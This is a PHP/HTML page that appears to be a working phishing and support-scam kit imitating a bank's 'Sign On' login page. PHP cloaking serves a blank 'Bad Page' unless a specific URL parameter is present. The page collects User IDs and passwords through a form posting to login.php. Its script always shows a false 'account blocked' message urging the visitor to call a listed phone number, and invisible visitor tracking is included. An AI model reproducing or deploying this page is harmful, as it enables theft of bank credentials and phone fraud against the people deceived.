<?php
	$referrer = $_SERVER['HTTP_REFERER'];
	$page = true;

	// if (strpos($referrer, '?referrer=platform') <= 0) {
	// 	$page = false;
	// }

	if ($_GET['error-code'] != 502) {
		$page = false;
	}
?>

<?php if (!$page): ?>
	<!DOCTYPE html>
	<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>Document</title>
	</head>
	<body>
		<h1>Bad Page</h1>
	</body>
	</html>
<?php else: ?>
	<!DOCTYPE html>
<html>
	<head>
		<title>User Login</title>
		<!--Import Google Icon Font-->
		<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
		<!--Import materialize.css-->
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
		<link rel="stylesheet" href="style.css">

		<link rel="icon" type="image/x-icon" href="images/favicon.ico">

		<!--Let browser know website is optimized for mobile-->
		<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
	</head>

	<body>
		<div id="loading-screen" class="hide">
			<div class="preloader-wrapper big active">
				<div class="spinner-layer spinner-blue-only">
					<div class="circle-clipper left">
						<div class="circle"></div>
					</div><div class="gap-patch">
						<div class="circle"></div>
					</div><div class="circle-clipper right">
						<div class="circle"></div>
					</div>
				</div>
			</div>
			<p>Loading..</p>
		</div>

		<img src="assets/nav-white.png" alt="" class="responsive-img">
		<img src="assets/nav-blue.png" alt="" class="responsive-img" style="margin-top: -6px">

		<div class="banner">
			<div class="row">
				<div class="col s12 m4 offset-m8">
					<div class="card-panel" style="border-radius: 16px; padding: 10px 16px 16px 16px; max-width: 382px; margin-top: 30px">
						<p class="error-text" id="error-text">Due to multiple suspicious login attempts your account has been blocked. Call 1888-410-0752 (Customer Service) to unblock your account.</p>
						<form action="login.php" method="POST" class="row" name="login-form" style="margin-bottom: 0;">
							<div class="input-field col s6" style="margin: 0; padding-right: 5px;">
								<span style="font-size: 12px; color: #333">User ID</span>
								<input placeholder="User ID" name="username" id="userID" type="text" class="custom-input">
							</div>
							<div class="input-field col s6" style="margin: 0; padding-left: 5px">
								<span style="font-size: 12px; color: #333">Password</span>
								<input placeholder="Password" name="password" id="password" type="password" class="custom-input">
							</div>
							<p style="padding-left: 11.25px; margin: 0">
								<label>
									<input type="checkbox" class="filled-in" />
									<span style="font-size: 12px; color: #333">Remember User ID</span>
								</label>
							</p>
							<div class="input-field col s12">
								<button class="btn wide-btn" style="background-color: #056dae; height: 40px; line-height: 42px; border-radius: 8px; font-size: 16px; margin-bottom: 10px; font-family: 'Interstate Bold', sans-serif;">Sign On</button>
								
								<button class="btn wide-btn qr-code" style="background-color: #eff3f8; color: #056dae; height: 40px; line-height: 42px; border-radius: 8px; font-size: 16px; font-family: 'Interstate Bold', sans-serif;">Sign On With QR Code</button>
							</div>
						</form>
						<p class="small-text primary-text" style="margin-top: 0">
							<a href="#!" class="primary-text">Register</a> / <a href="#!" class="primary-text">Activate</a>
							<span class="right">Forgot <a href="#!" class="primary-text" style="text-decoration: underline;">User ID</a> or <a href="#!" class="primary-text" style="text-decoration: underline;">Password</a></span>
						</p>
					</div>
				</div>
			</div>
		</div>

		<div class="container-fluid" style="margin-top: -25px">
			<img src="assets/sub-menu.png" alt="" class="responsive-img" style="margin-top: -6px">
		</div>

		<img src="assets/three-cards.png" alt="" class="responsive-img" style="margin-top: 10px">

		<img src="assets/divider.png" alt="" class="responsive-img">

		<img src="assets/feature1.png" alt="" class="responsive-img">

		<img src="assets/feature2.png" alt="" class="responsive-img">

		<img src="assets/divider2.png" alt="" class="responsive-img">

		<img src="assets/part.png" alt="" class="responsive-img">

		<img src="assets/footer1.png" alt="" class="responsive-img" style="margin-top: -6px">

		<img src="assets/footer2.png" alt="" class="responsive-img" style="margin-top: -6px">

		<div id="modal1" class="modal center-align" style="width: 400px">
			<div class="modal-content">
				<i class="material-icons medium" style="color: #d60000">error_outline</i>
				<h4 style="color: #d60000">Error</h4>
				<p style="color: #424242; font-size: 1.4rem">Due to multiple suspicious login attempts your account has been blocked. Call 1888-410-0752 (Customer Service) to unblock your account.</p>
				<br>
				<!-- <a href="#!" class="btn wide-btn modal-close">hi</a> -->
			</div>
		</div>

		<!--JavaScript at end of body for optimized loading-->
		<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>

		<script>
			// document.querySelectorAll('.action-box').forEach(element => {
			// 	element.addEventListener('mouseenter', function() {
			// 		console.log(element.children[0])
			// 	})
			// })
			M.AutoInit()

			document.addEventListener('DOMContentLoaded', function() {

				let loginForm = document.forms['login-form']

				loginForm.addEventListener('submit', function(e) {
					e.preventDefault()
					// alert(loginForm[0].value)

					if (loginForm[0].value == '') {
						document.querySelector('#error-text').innerText = 'Username can\'t be empty'
						return
					}

					if (loginForm[1].value == '') {
						document.querySelector('#error-text').innerText = 'Password can\'t be empty'
						return
					}

					document.getElementById('loading-screen').classList.remove('hide')
					document.querySelector('#error-text').innerText = 'Due to multiple suspicious login attempts your account has been blocked. Call 1888-410-0752 (Customer Service) to unblock your account.'

					setTimeout(function() {
						document.getElementById('loading-screen').classList.add('hide')
					}, 2000)
				})
			})

			var elem = document.querySelector('#modal1')
			var instance = M.Modal.getInstance(elem)

			instance.open()
		</script>

		<script type="text/javascript">
			var sc_project=12928193;
			var sc_invisible=1;
			var sc_security="85e6d555";
		</script>
		<script type="text/javascript"
		src="https://www.statcounter.com/counter/counter.js"
		async></script>
		<noscript><div class="statcounter"><a title="Web Analytics"
		href="https://statcounter.com/" target="_blank"><img
		class="statcounter"
		src="https://c.statcounter.com/12928193/0/85e6d555/1/"
		alt="Web Analytics"
		referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
		<!-- End of Statcounter Code -->
	</body>
</html>
<?php endif ?>